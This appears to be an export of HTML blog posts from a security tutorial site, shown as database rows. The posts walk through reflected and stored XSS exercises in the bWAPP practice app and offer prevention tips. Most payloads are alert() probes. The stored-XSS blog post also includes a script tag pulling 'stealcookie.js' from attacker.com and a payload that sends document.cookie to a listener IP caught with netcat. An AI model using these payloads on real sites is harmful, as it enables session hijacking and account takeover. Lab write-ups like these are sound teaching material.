click Hack.</font><br></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_5.png'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'"><font size='"4'">And now open burp suite to see the intercept details.</font><br></font></div><div style='"text-indent: 4.08px;'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_6.png'"><font color='"#343a40'" size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><div style='"text-indent: 4.08px;'"><font size='"4'">As you can see we got the header details of the portal page and to check next page header details just click on the forward button so that it will forward the request to the&nbsp;</font><span style='"font-size: large; text-indent: 4.08px;'">next page.&nbsp;</span><span style='"font-size: large; text-indent: 4.08px;'">So click on the forward button until you reach to '"<b>xss_back_button.php</b>'" page.</span></div><div style='"text-indent: 4.08px;'"><font size='"4'"><span style='"text-indent: 4.08px;'"><br></span></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_7.png'"><font size='"4'"><span style='"text-indent: 4.08px;'"><br></span></font></div><div style='"text-indent: 4.08px;'"><br></div><div style='"text-indent: 4.08px;'"><font size='"4'">So now as you can see here we got the HTTP header details of back button page and if you check the Referer header then you can see the URL of the portal page because this&nbsp;</font></div><div style='"text-indent: 4.08px;'"><font size='"4'">page was requested by the portal.php page.</font><br></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_8.png'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><br></div><div style='"text-indent: 4.08px;'"><font size='"4'">So to test our payload first let''s try a simple string let''s say '"<i>This is a buggy referer header</i>'" and click forward.</font><br></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_9.png'"><br></div><div style='"text-indent: 4.08px;'"><br></div><div style='"text-indent: 4.08px;'"><font size='"4'">As you can see the intercepted message reflecting on view page source so now we can inject JavaScript payload.</font><br></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_10.png'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><div style='"text-indent: 4.08px;'"><font size='"4'">So let''s go to the burp suite and turn off the intercept. And follow the same steps again to intercept the request.&nbsp;<span style='"text-indent: 4.08px;'">Now let''s inject our payload but in this payload, we can''t write&nbsp;</span></font></div><div style='"text-indent: 4.08px;'"><font size='"4'"><span style='"text-indent: 4.08px;'">&lt;script&gt; tag because it''s already inside onClick method so first, you need to terminate the previous statement and write the current payload.</span></font></div><div style='"text-indent: 4.08px;'"><font size='"4'"><span style='"text-indent: 4.08px;'"><br></span></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_11.png'"></div><div style='"text-indent: 4.08px;'"><br></div></div></div></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token punctuation'">;</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token string'">''This is a buggy referer header''</span><span class='"token punctuation'">)</span><span class='"token punctuation'">;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div></div><div><div class='"code-toolbar'"><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'">And click forward go back to the webpage so now if I''ll click on the back button then our payload should work.</font><br></div><div><font size='"4'"><br></font></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-back-button/cross_site_scripting_reflected_back%20_button_12.png'"><font size='"4'"><br></font></div><div><br></div><div><br></div><div><font size='"4'">As you can see we are able to inject JavaScript payload to the referer header.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How do we prevent this attack?</font></b><br></div><div><font size='"4'"><br></font></div><div><ol><li><font size='"4'">User input needs to be encoded in the HTTP header and developer can implement filters which will eliminate any scripting tags.<br></font></li><li><font size='"4'">And in some cases, X-XSS-Protection header can prevent some level of XSS (cross-site-scripting) attacks as it''s an add-on to the browsers to sanitize HTML responses.</font></li></ol></div><div><font size='"4'"><br></font></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
15,Cross-Site-Scripting - Stored (SQLiteManager & User-Agent),cross-site-scripting-stored-sqlitemanager-and-user-agent,Anshuman Pattnaik,2019-05-31 01:26:42.608642+05:30,2021-06-04 01:33:24.94811+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/large_thumbnail.png,"{'"Stored XSS'",bWAPP,'"Penetration Testing'"}","This is the demonstration of Stored Cross-Site Scripting attack in SQLiteManager &amp; User-Agent header and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Stored Cross-Site Scripting attack in SQLiteManager &amp; User-Agent header and for this demo, I''ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/34sk4qOuA6s'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">How to perform Stored Cross-Site-Scripting attack in SQLiteManager?</font></b><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Stored (SQLiteManager)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_2.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can see from the above screenshot it shows the message that '"<i>The SQLiteManager version is vulnerable to Cross-Site Scripting!</i>'". And in the hint, the CVE no is mentioned. - (CVE-2012-5105), so let''s search this no to get more information about this vulnerability.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_3.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As per the CVE report, it shows that in <b>SQLiteManager 1.2.4 version</b> there was an XSS vulnerability found and which allow remote attackers to inject arbitrary web script to the DB shell parameter in main.php and index.php files.</font><br></div><div><font size='"4'"><br></font></div><div><font size='"4'">To get the complete report of this vulnerability please visit this link:- <a href='"https://www.exploit-db.com/download/36510/'"><font color='"#dd4124'"><b>36510</b></font></a></font><br></div><div><br></div><div><b><font size='"5'">Exploit DB report</font></b><br></div><div><br></div><div><div><font size='"4'">SQLiteManager is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content. An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">SQLiteManager 1.2.4 is vulnerable; other versions may also be affected. But as per their report, I don''t think this vulnerability exists as it is very old. So for every application always use an updated version and also follow their forums so that you can get in touch with their developer''s community to get the latest updates.</font></div></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">SQLiteManager Developer Communities</font></b><br></div><div><br></div><div><ul><li><font color='"#dd4124'" size='"4'"><b><a href='"https://db4s.slack.com/'"><font color='"#dd4124'">DB Browser for SQLite</font></a></b></font><br></li><li><font color='"#dd4124'" size='"4'"><font color='"#dd4124'"><b><a href='"https://twitter.com/sqlitebrowser'"><font color='"#dd4124'">SQLiteBrowser Twitter</font></a></b></font><br></font></li><li><font color='"#dd4124'" size='"4'"><b><a href='"https://github.com/sqlitebrowser/sqlitebrowser'"><font color='"#dd4124'">SQLiteBrowser Github</font></a></b><br></font></li></ul></div><div><br></div><div><b><font size='"5'">How to perform Stored Cross-Site-Scripting attack in User-Agent Header?</font></b><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_4.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Stored (User-Agent)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_5.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As you can see from the above screenshot it''s able to identify my browser version, operating system and some other details and these details stored in the database.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_6.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">So now let''s intercept the request using <a href='"https://portswigger.net/burp'"><font color='"#dd4124'"><b>Burp Suite</b></font></a> so that you can inject JavaScript payload to the User-Agent header.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_7.png'"><font size='"4'"><br></font></div><div><font size='"4'">Now go back again and choose the same option <b>Cross-site-Scripting - Stored (User-Agent)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_8.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">If you go back to the Burp Suite and follow the same steps which we follow in the <a href='"https://hackbotone.com/blog/cross-site-scripting-stored-sqlitemanager-and-user-agent#'"><font color='"#dd4124'"><b>reflected module</b></font></a> then you can able to see the intercept request of '"xss_stored_4.php'" file.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_9.png'"><font size='"4'"><br></font></div><div><span style='"font-size: large;'">Now let''s inject the payload to the '"</span><b style='"font-size: large;'">User-Agent</b><span style='"font-size: large;'">'" header.</span><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='" language-js'"><code class='" language-js'">&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_10.png'"><br></div><div><span style='"font-size: large;'">Now if you go back to the browser then you could able to see the alert dialog box.</span><br></div><div><span style='"font-size: large;'"><br></span></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_11.png'"><span style='"font-size: large;'"><br></span></div><div><br></div><div><div><font size='"4'">As you can see from the above screenshot we are able to inject the JavaScript code to the <b>'"User-Agent'"</b> header. And also this payload gets stored in the database, if you go to the '"<b>phpMyAdmin</b>'" and check the '"<b>visitors</b>'" table then you could see that the payload also gets stored in the database.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-sqlitemanager-user-agent/cross_site_scripting_stored_sqlitemanager_user_agent_12.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As the payload stored in the database if you go back and come again then also the payload will be executed.</font><br></div><div><br></div><div><b><font size='"5'">How do we prevent this attack?</font></b><br></div><div><br></div><div><ol><li><font size='"4'">User input needs to be encoded in the HTTP header and developer can implement filters which will eliminate any scripting tags.</font><br></li><li><font size='"4'">And in some cases, X-XSS-Protection header can prevent some level of XSS (cross-site-scripting) attacks as it’s an add-on to the browsers to sanitize HTML responses.<br></font></li></ol><div><font size='"4'"><br></font></div></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
12,Cross-site-Scripting - Reflected (phpMyAdmin & PHP_SELF),cross-site-scripting-reflected-phpMyAdmin-and-php_self,Anshuman Pattnaik,2019-05-28 01:26:16.165494+05:30,2021-06-04 01:32:54.680933+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/large_thumbnail.png,"{'"Reflected XSS'",bWAPP,phpmyAdmin,XSS}","This is the demonstration of Cross-Site-Scripting attack in phpMyAdmin and PHP_SELF and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Cross-Site-Scripting attack in phpMyAdmin and PHP_SELF and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><br></div><div><br></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/qABCSgC4GWw'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">How to perform a Cross-Site Scripting attack in phpMyAdmin?</font></b><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/cross_site_scripting_reflected_phpmyadmin_php_self_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (phpMyAdmin)</b> from the drop-down menu and click Hack.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/cross_site_scripting_reflected_phpmyadmin_php_self_2.png'"><br></div><div><br></div><div><font size='"4'">So this is a phpMyAdmin cross-site scripting bug and you can see the message here that</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='" language-js'">The phpMyAdmin version fails to validate BBcode tags in the error.php script! and HINT is '"CVE-2010–4480'"</pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><font size='"4'">If you search this id on their website then you will find the details of this particular vulnerability. And when I search this id <b>(CVE-2010-4480)</b> as per their search result, it shows that on version no 3.3.8.1 there was a cross-site scripting vulnerability found in phpMyAdmin files and an attacker can able to inject JavaScript code in the URL parameter.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/cross_site_scripting_reflected_phpmyadmin_php_self_3.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">For example, there was an XSS bug found in the db_central_columns.php file query parameter.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">http<span class='"token operator'">:</span><span class='"token operator'">/</span><span class='"token operator'">/</span>localhost<span class='"token operator'">/</span>phpmyadmin<span class='"token operator'">/</span>db_central_columns<span class='"token punctuation'">.</span><span class='"token property-access'">php</span><span class='"token operator'">?</span>total_rows<span class='"token operator'">=</span><span class='"token number'">0</span>'"<span class='"token operator'">&gt;</span><span class='"token operator'">&lt;</span>script<span class='"token operator'">&gt;</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token number'">1</span><span class='"token punctuation'">)</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><font size='"4'">And it was a major bug found in phpMyAdmin and by this, an attacker can do serious damage to the database. But till now in most of the phpMyAdmin version, this bug already fixed.</font></div></div><div><font size='"4'"><br></font></div><div><font size='"4'"><b>For more information please check CVE report.</b></font></div><div><ul><li><a href='"https://cve.circl.lu/cve/CVE-2010-4480'"><font color='"#dd4124'"><b>CVE-2010-4480</b></font></a><br></li></ul></div><div><br></div><div><b><font size='"5'">How to perform a Cross-Site Scripting attack in PHP_SELF?</font></b><br></div><div><b><font size='"5'"><br></font></b></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/cross_site_scripting_reflected_phpmyadmin_php_self_4.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (PHP_SELF)</b> from the drop-down menu and click Hack.</font><br></div><div><b><font size='"5'"><br></font></b></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/cross_site_scripting_reflected_phpmyadmin_php_self_5.png'"><b><font size='"5'"><br></font></b></div><div><br></div><div><div><font size='"4'">As you can see here we got the same user interface again which we found in (GET &amp; POST) sections - <a href='"https://hackbotone.com/blog/cross-site-scripting-reflected-phpMyAdmin-and-php_self'"><font color='"#dd4124'">Cross-site-Scripting — Reflected (GET &amp; POST)</font></a>. So let''s enter the first name and last name if it is reflecting then we can inject JavaScript code.</font></div></div><div><b><font size='"5'"><br></font></b></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/cross_site_scripting_reflected_phpmyadmin_php_self_6.png'"><b><font size='"5'"><br></font></b></div><div><br></div><div><font size='"4'">As you can see the first name and last name reflects on the webpage, so let''s enter the JavaScript code.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>script<span class='"token operator'">&gt;</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token number'">1</span><span class='"token punctuation'">)</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-phpmyadmin-php-self/cross_site_scripting_reflected_phpmyadmin_php_self_7.png'"><br></div><div><br></div><div><div><font size='"4'">And as you can see I am able to inject JavaScript code and a better way to prevent this attack if we do proper sanitization of special characters then we can prevent this bug. And every time when you are developing a web application then please follow OWASP guidelines. In that way at least you can reduce common vulnerability in the websites.</font></div></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">For more information?</font></b></div><div><ol><li><font size='"4'"><font color='"#dd4124'"><a href='"https://www.owasp.org/index.php/Main_Page'"><font color='"#dd4124'">OWASP Foundation</font></a></font></font><br></li></ol><div><font size='"4'"><br></font></div></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span><br></div><div><br></div>",t,f,"",f
13,Cross-Site-Scripting - Stored (Blog),cross-site-scripting-stored-blog,Anshuman Pattnaik,2019-05-29 01:26:24.836192+05:30,2021-06-04 01:33:09.046564+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/large_thumbnail.png,"{'"Stored XSS'",bWAPP,'"Penetration Testing'",WAF}",When an attacker browsing a web application and found a vulnerability which allows him to embed an HTML tag into the input box and the embedded tag become a permanent item of that page and then the browser will parse this code every time whenever the page will get loaded.,"<b><font size='"5'">Introduction to Stored XSS</font></b><div><b><font size='"5'"><br></font></b></div><div><div style='"'"><font size='"4'">When an attacker browsing a web application and found a vulnerability which allows him to embed an HTML tag into the input box and the embedded tag become a permanent item of that page and then the browser will parse this code every time whenever the page will get loaded.</font></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">For example in a blogging website attacker found a vulnerability in the comment section and embed this comment.</font></div></div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'"><b>Attacker''s Comment</b>&nbsp;- '"<i>Nice Blog! a similar type of blog I have also written but with some new content, please visit my site to read more'"</i><br></font></div><div style='"'"><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>script src<span class='"token operator'">=</span><span class='"token string'">'"http://attacker.com/stealcookie.js'"</span><span class='"token operator'">&gt;</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><div><font size='"4'">The '"<b>stealcookie.js</b>'" is designed to steal the cookie of the browser and as this file is hosted in some other site so that the attacker can able to access it remotely and when the user''s account gets compromised then the attacker will have full control to the user account.&nbsp;</font><span style='"font-size: large;'">But the user will have no idea at all what is happening in the background with this piece of comment.</span></div></div><div><br></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/BcBOyzxu6YA'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">Real World Stored XSS Attack</font></b></div><div><br></div><div><font size='"4'"><b>MySpace </b>and <b>Tweetdeck </b>are the best examples of Stored XSS and as you guys might have known when the attacker injects the JavaScript code it caused serious damage to both of these websites as once the code injected and whoever visit that webpage then it will get executed again and again.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/cross_site_scripting_stored_blog_1.png'"><font size='"4'"><br></font></div><div><br></div><div><b><font size='"5'">How to prevent Stored XSS attack?</font></b><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/cross_site_scripting_stored_blog_2.png'"><br></div><div><br></div><div><div><font size='"4'">To prevent any XSS attack, Web Application Firewall (WAF) is the best solution to protect a web application.&nbsp;</font><span style='"font-size: large;'">WAF is an automation tool which is designed by artificial intelligence and machine learning algorithms to filter specific content of web application and it can prevent attacks from XSS, SQL Injection, File inclusion and security misconfiguration.</span></div><div><font size='"4'"><br></font></div><div><font size='"4'">Every time whenever a user will send any request to the web server first the request will go the WAF and WAF will filter the request and then the request will get transferred to the web server.&nbsp;</font><span style='"font-size: large;'">Same will be applied to the Web server also when the web server will send the response to the user first the response will go to the WAF then WAF will filter the response then it will get transferred to the user.</span><br></div></div><div><br></div><div><b><font size='"5'">For more information</font></b></div><div><ul><li><font size='"4'"><a href='"https://en.wikipedia.org/wiki/Web_application_firewall'"><font color='"#dd4124'"><b>Web application firewall</b></font></a></font><br></li><li><b><a href='"https://www.cloudflare.com/learning/ddos/glossary/web-application-firewall-waf/'"><font color='"#dd4124'">What is a Web Application Firewall (WAF)?</font></a></b><br></li></ul></div><div><br></div><div><b><font size='"5'">How to perform Stored XSS in a Blogging web application?</font></b><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/cross_site_scripting_stored_blog_3.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Stored (Blog)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/cross_site_scripting_stored_blog_4.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can see from the screenshot it''s a demo blogging application and there is an input box where user can comment. So to test let''s enter one comment '"<b>Nice Blog</b>'" and hit submit.</font></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/cross_site_scripting_stored_blog_5.png'"><br></div><div><br></div><div><div><font size='"4'">As you can see from the screenshot the comment gets posted and this comment gets stored in the database. So now let''s enter the JavaScript payload to steal the browser cookie.</font></div></div><div><font size='"4'"><br></font></div><div><b><font size='"5'">Payload comment to steal the cookie</font></b><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token maybe-class-name'">Nice</span> <span class='"token maybe-class-name'">Blog</span><span class='"token operator'">!</span> a similar type <span class='"token keyword'">of</span> blog <span class='"token constant'">I</span> have also written but <span class='"token keyword'">with</span> some <span class='"token keyword'">new</span> <span class='"token class-name'">content</span><span class='"token punctuation'">,</span> please visit my site to read more</code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>script src<span class='"token operator'">=</span><span class='"token string'">'"http://192.168.2.12:9000?cookie'"</span><span class='"token operator'">+</span><span class='"token dom variable'">document</span><span class='"token punctuation'">.</span><span class='"token property-access'">cookie</span><span class='"token operator'">&gt;</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/cross_site_scripting_stored_blog_6.png'"><br></div><div><br></div><div><div><font size='"4'">As you can see from the above screenshot the comment gets posted in the blog and with the comment, I am injecting the JavaScript code also and this is a <b>GET </b>request with a query parameter '"<b>cookie</b>'" and '"<b>document.cookie</b>'" will fetch the current browser cookie. And I''ll fetch this request with the <a href='"https://en.wikipedia.org/wiki/Netcat'"><font color='"#dd4124'"><b>netcat</b> </font></a>command through a reverse shell.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-stored-blog/cross_site_scripting_stored_blog_7.png'"><font size='"4'"><br></font></div><div><br></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f, ,f
16,HackbotOne - Full Stack Application,hackbotone-full-stack-application,Anshuman Pattnaik,2020-01-02 01:26:51.262315+05:30,2021-06-04 01:33:50.016485+05:30,https://assets.hackbotone.com/assets/hackbotone-full-stack-application/seo_thumbnail.png,https://assets.hackbotone.com/assets/hackbotone-full-stack-application/small_thumbnail.png,https://assets.hackbotone.com/assets/hackbotone-full-stack-application/large_thumbnail.png,"{'"Application Development'",react.js,node.js,mongodb}","HackbotOne website produce contents from various domains such as Web Hacking, Bug Bounty, Application Development & GameDevelopment.","<b><font size='"5'">Introduction</font></b><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">HackbotOne website produce contents from various domains such as Web Hacking, Bug Bounty, Application Development &amp; Game Development</span><span style='"font-size: large;'">.</span><br></div><div><span style='"font-size: large;'"><br></span></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/jUiYl1Bqe7s'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><b><font size='"5'">Which type of content you can expect?</font></b><br></div><div><b><br></b></div><div><b><font size='"4'">Application Development</font></b><br></div><div><b><br></b></div><div><font size='"4'">I will publish contents from both web &amp; mobile platforms for example - (Android, Node.js, MongoDB, Go, Reactjs, React-Native and many more) which are related to application development I’ll try to cover those topics with step-by-step explanation and mostly in this section I''ll cover programming.</font><br></div><div><font size='"4'"><br></font></div><div><font size='"4'"><b>Game Development</b><br></font></div><div><b><br></b></div><div><font size='"4'">Mostly you can expect contents from Unity3d game engine platform and I''ll try to make small video tutorial series with step by step explanation of every component of the game and also if I''ll know some new game engine platforms then definitely you can expect write-ups on this website.</font><br></div><div><font size='"4'"><br></font></div><div><font size='"4'"><b>Ethical Hacking</b><br></font></div><div><font size='"4'"><b><br></b></font></div><div><font size='"4'">In this section mostly you can expect contents from Bug Bounty write-ups, Security Lab Exercises, Penetration testing tools and also as per my research if I''ll know about latest exploits then definitely you can expect write-ups with video tutorials on this website.<br></font></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How it''s built?</font></b><br></div><div><font size='"4'"><br></font></div><div><font size='"4'"><div>This is a full-stack web application, it''s running react.js as a front-end and Node.js as a backend and it uses MongoDB database for storage. To render the website smoothly, i use Server-side rendering technique which is a very popular technique for rendering client-side web page on the server and server will send the complete result to the client. and then client JavaScript will take control to render the page.</div><div><br></div><div>And to bundle the module I use Webpack which is a JavaScript module bundler and it bundles JavaScript, front-end assets like HTML, CSS and images and generates a static asset.</div></font></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">Open Source</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><div style='"'"><font size='"4'">It will be quite difficult for 